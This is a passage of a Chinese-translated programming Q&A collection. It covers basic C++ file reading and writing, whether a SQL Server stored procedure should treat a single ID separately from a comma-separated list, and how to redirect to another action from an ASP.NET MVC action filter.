还有其他功能可以提供帮助，例如[fprintf](http://www.cplusplus.com/reference/clibrary/cstdio/fprintf.html)、[fscanf](http://www.cplusplus.com/reference/clibrary/cstdio/fscanf.html)、[fputs](http://www.cplusplus.com/reference/clibrary/cstdio/fputs.html)和[fgets](http://www.cplusplus.com/reference/clibrary/cstdio/fgets.html)。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-15T15:04:27.490

如果你不喜欢自己做基本的文件处理，你可能想看看[The boost library](http://www.boost.org/)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-15T16:19:37.840

您可能会查看 fprintf() 和 fscanf() 之类的东西。但是为了让你开始：

```
#include <iostream>
#include <fstream>
#include <iomanip>

using namespace std;

#define SHOW(X) cout << # X " = " << (X) << endl

void write()
{
  ofstream o("filefoo");
  o << "test 1 2 3" << endl;
}

void read()
{
  ifstream i("filefoo");
  string s[4];
  i >> s[0] >> s[1] >> s[2] >> s[3];

  for( int j=0; j<4; j++ )
    SHOW(s[j]);
}

int main()
{
  write();
  read();
} 
```

# sql - 在 [table] 中只有 1 行的情况下使用 'where id IN [table]' 会导致性能下降？

> ID：550984
> 
> 赞同：1
> 
> 时间：2009-02-15T14:57:12.623
> 
> 标签：sql, database, tsql, sql-server-2008, stored-procedures

我有一个存储过程，它采用逗号分隔的 ID 字符串。我将它们拆分并将它们放入一个临时表中，并使用**where id IN [table]从另一个表中提取记录**

当只为参数传入一个 id 时，是否可以使用相同的过程？我可以编写第二个存储过程，它会做同样的事情，而是做**where id = @id**。

我有许多存储过程，其中可以传入多个 ID 或只传入一个。我是尝试重用现有过程还是编写新过程？性能受到显着影响吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2009-02-15T15:04:28.393

您可能想尝试 JOIN 而不是 WHERE id IN - 尽管我认为您将获得相同的查询计划。

所以我假设你正在做：

```
SELECT COl1, Col2, ...
FROM MyTable
WHERE id IN (SELECT id FROM @MyTempTable) 
```

在这种情况下，等效的 JOIN 语法将是：

```
SELECT COl1, Col2, ...
FROM  MyTable AS T1
     JOIN @MyTempTable AS T2
         ON T2.id = T1.id 
```

在第二种情况下，无论是 1 行还是多行，只要 [id] 被索引（我假设它是您表上的 PK，并使用聚集索引），它将非常有效。

（请注意，如果您在 @MyTempTable 中有 DUP ID，您最终也会从 MyTable 中获得欺骗 :()

为了获得最佳性能，值得将 [id] 明确声明为临时表上的 PK（但鉴于它仅包含几行，它可能不会产生太大的可能性）

```
DECLARE @TempTable TABLE
(
    id int NOT NULL,
    PRIMARY KEY
    (
        id
    )
) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-15T15:18:01.590

在我观察到它的性能问题之前，我不会担心只有一个项目会影响性能。查询优化器很聪明，可以很好地处理其中的一项，但即使没有，您的例程也可能在其他地方最慢。

我会看看字符串解析、临时表创建和插入临时表的性能。使这些尽可能快，将对整体性能产生比您在或 = 用于单项案例时更大的影响。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-15T15:05:49.453

您可以使用相同的过程，但使用条件语句来确定是否使用 IN 子句。

IN 会影响性能；执行计划应该为您详细说明。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-15T15:09:24.980

正如 rde6173 所说，对临时表执行 COUNT 以确定要使用哪个 SELECT 查询。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2009-02-15T15:18:17.427

由于您已指定它是一个逗号分隔的列表，因此您可以在存储过程中执行以下操作：

```
IF (CHARINDEX(',', @id) = 0)
BEGIN
    -- the @id parameter contains a single value
    SELECT *
    FROM your_table
    WHERE id = @id  -- maybe need to cast @id if the column isn't a string
END
ELSE
BEGIN
    -- the @id parameter contains a comma-delimited list
    -- only perform the expensive splitting logic at this point
    -- eg, SET @yourTempTable = dbo.SplitCommaDelimitedIDsIntoTable(@id)
    SELECT *
    FROM your_table
    WHERE id IN (SELECT id FROM @yourTempTable)
END 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2009-06-07T01:45:19.893

当您创建临时表（不是表变量）时，它具有统计信息。因此，优化器将确定最佳计划，一个 ID 的最佳计划可能与 10 个 ID 的最佳计划相同，但对于 50K ID，它可能会选择不同的计划。因此，除非您有性能问题，否则我不会尝试进一步优化它。

# asp.net-mvc - 如何让过滤器重定向到另一个动作？

> ID：550995
> 
> 赞同：78
> 
> 时间：2009-02-15T15:05:05.397
> 
> 标签：asp.net-mvc, redirecttoaction

`RedirectToAction`受到保护，我们只能在操作中使用它。但是如果我想在过滤器中重定向？

```
public class IsGuestAttribute: ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (!Ctx.User.IsGuest) 
            filterContext.Result = (filterContext.Controller as Controller)
                .RedirectToAction("Index", "Home");
    }
} 
```

* * *

## 回答 #1

> 赞同：104
> 
> 时间：2009-02-15T16:45:49.883

`RedirectToAction`只是构造 a 的辅助方法`RedirectToRouteResult()`，因此您只需为您的操作创建一个带有值的新`RedirectToRouteResult()`传递。`RouteValueDictionary()`

基于来自@Domenic 的代码的完整示例在下面的评论中：

```
public class IsGuestAttribute: ActionFilterAttribute
{
    public override void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (!Ctx.User.IsGuest) 
        {
            filterContext.Result = new RedirectToRouteResult(
                new RouteValueDictionary 
                { 
                    { "controller", "Home" }, 
                    { "action", "Index" } 
                });
        }
    }
} 
```

* * *

## 回答 #2

> 赞同：88
> 
> 时间：2010-07-02T10:15:26.390

这是一个代码示例：

```
public override void OnActionExecuting(ActionExecutingContext filterContext)
{

    if (!Ctx.User.IsGuest)
    {
        RouteValueDictionary redirectTargetDictionary = new RouteValueDictionary();
        redirectTargetDictionary.Add("action", "Index");
        redirectTargetDictionary.Add("controller", "Home");

        filterContext.Result = new RedirectToRouteResult(redirectTargetDictionary);
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-25T14:59:00.450

我知道我参加聚会有点晚了，但是我使用了 veggerby 的解决方案并构建了一个可能对某些人有用的辅助类，所以我想在这里提供它：

```
public static class ActionFilterHelpers
{
    public static void Redirect(this ActionExecutingContext filterContext, String controller, String action, object routeValues)
    {
        filterContext.Result = Redirect(controller, action, routeValues);
    }

    public static ActionResult Redirect(String controller, String action, object routeValues)
    {
        var routeValues = new RouteValueDictionary();

        routeValues["controller"] = controller;
        routeValues["action"] = action;

        foreach (var keyValue in new ObjectDictionary(routeValues))
            routeValues.Add(keyValue.Key, keyValue.Value);

        return new RedirectToRouteResult(routeValues);
    }
} 
```

我提供了一个返回重定向的静态方法`ActionResult`和一个扩展的扩展方法`filterContext`。希望有人觉得这很有用。

`ObjectDictionary`是一个使用反射从构造它的对象的属性创建字典的类。我没有包含该代码，因为我相信在框架的某个地方有更好的方法来做到这一点。我还没有找到它，但我不希望其他人继承我的潜在错误。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-02-08T18:52:01.460

安全/授权/身份验证过滤器应该使用[AuthorizeAttribute](https://msdn.microsoft.com/en-us/library/system.web.mvc.authorizeattribute%28v=vs.118%29.aspx)和[IAuthorizationFilter](https://msdn.microsoft.com/en-us/library/system.web.mvc.iauthorizationfilter%28v=vs.118%29.aspx)。

```
public class IsGuestAttribute: AuthorizeAttribute, IAuthorizationFilter
{
    public void OnResultExecuted(ResultExecutedContext filterContext)
    {
    }
    public void OnActionExecuting(ActionExecutingContext filterContext)
    {
        if (!Ctx.User.IsGuest) 
        {
            filterContext.Result = new RedirectToRouteResult(
                new RouteValueDictionary 
                { 
                    { "controller", "Home" }, 
                    { "action", "Index" } 
                });
        }
    }
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2017-07-12T19:06:08.723

**用法：** `filterContext.RedirectToAction("Login", "Account");`

这是我编写的一个辅助类，其中包含一些扩展方法，用于在更多地方提供 RedirectToAction 功能。这对于 OP 来说为时已晚，但希望它可以帮助某人！

```
public static class RedirectHelper
{
    // RedirectToAction Extension Methods
    public static void RedirectToAction(this HttpResponseBase response, String action, String controller, object routeValues = null, bool endResponse = false)
    {
        response.RedirectToRoute(CreateRoute(action, controller, routeValues));
        if (endResponse) response.End();
    }
    public static void RedirectToAction(this HttpResponse response, String action, String controller, object routeValues = null, bool endResponse = false)
    {
        response.RedirectToRoute(CreateRoute(action, controller, routeValues));
        if (endResponse) response.End();
    }
    public static void RedirectToAction(this ActionExecutingContext filterContext, String action, String controller, object routeValues = null, bool endResponse = false)
    {
        if (endResponse) filterContext.HttpContext.Response.RedirectToAction(action, controller, routeValues, true);
        else filterContext.Result = new RedirectToRouteResult(CreateRoute(action, controller, routeValues));
    }
    public static void RedirectToAction(this ExceptionContext filterContext, String action, String controller, object routeValues = null, bool endResponse = false)
    {
        if (endResponse) filterContext.HttpContext.Response.RedirectToAction(action, controller, routeValues, true);
        else {
            filterContext.ExceptionHandled = true;
            filterContext.Result = new RedirectToRouteResult(CreateRoute(action, controller, routeValues));
        }
    }
    // Route Value Derivation
    public static RouteValueDictionary CreateRoute(String action, String controller, object routeValues = null)
    {
        RouteValueDictionary result = routeValues != null ? 
            HtmlHelper.AnonymousObjectToHtmlAttributes(routeValues) : 
            new RouteValueDictionary();
        result["controller"] = controller;
        result["action"] = action;
        return result;
    }
} 
```

还有更多 ControllerContexts 不包括在内，但根据您的需要添加您自己的应该相当容易。**********